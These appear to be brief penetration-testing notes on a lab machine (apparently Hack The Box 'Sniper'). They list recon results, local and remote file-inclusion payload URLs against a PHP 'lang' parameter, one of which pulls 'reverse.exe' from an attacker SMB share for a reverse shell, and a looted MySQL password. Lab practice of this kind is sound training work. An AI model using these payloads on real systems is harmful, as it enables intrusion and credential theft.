# Recon
- PORT 80 Running HTTP php app
- Microsoft IIS10.0
- PHP 7.3.1
- Register & Login function
# VULNS
- Possible LFI with http://10.10.10.151/blog/?lang=css/style.css
- LFI success on http://10.10.10.151/blog/?lang=\\localhost\c$\windows\win.ini
- RFI Success with http://10.10.10.151/blog/?lang=\\10.10.14.162\naiame\reverse.exe
# LOOT
- mysql connection "localhost","dbuser","36mEAhz/B8xQ~2VM","sniper"
